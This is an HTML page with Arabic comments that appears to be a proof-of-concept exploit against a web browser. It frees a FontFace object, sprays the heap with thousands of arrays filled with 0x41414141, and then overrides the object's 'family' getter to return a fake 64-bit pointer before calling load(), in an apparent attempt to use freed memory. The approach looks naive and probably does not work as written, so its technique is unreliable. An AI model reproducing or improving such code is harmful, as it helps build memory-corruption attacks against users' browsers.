<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <div id="log">بدء الضغط على الذاكرة...</div>
    <script>
        function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }

        // 1. إنشاء كائن فونت وحذفه فوراً
        let A = new FontFace('x', 'local(Arial)', {});
        document.fonts.add(A);
        document.fonts.delete(A); // حذف الكائن فوراً لجعله مرشحاً للـ GC

        // 2. إرهاق الذاكرة لإجبار المحرك على إعادة استخدام المكان المحرر
        log("بدء الرش المكثف...");
        let spray = [];
        for(let i=0; i<5000; i++) {
            spray.push(new Uint32Array(0x1000).fill(0x41414141));
        }
        
        log("الرش اكتمل. جاري محاولة الوصول للذاكرة...");
        
        // 3. محاولة الوصول للكائن المحرر (بدون then)
       try {
    log("محاولة توجيه المؤشر...");
    
    // سنستخدم قيمة 64-بت (كعنوان ذاكرة حقيقي في بيئة 64-بت)
    // 0x1234567890abcdef
    let fakePointer = 0x1234567890abcdefn; 

    Object.defineProperty(A, 'family', {
        get: function() {
            return fakePointer;
        }
    });

    log("جاري استدعاء load للوصول للعنوان المضلل...");
    A.load();
    
    log("تمت العملية بنجاح.");
} catch(e) {
    log("خطأ في الوصول: " + e.message);
}




    </script>
</body>
</html>
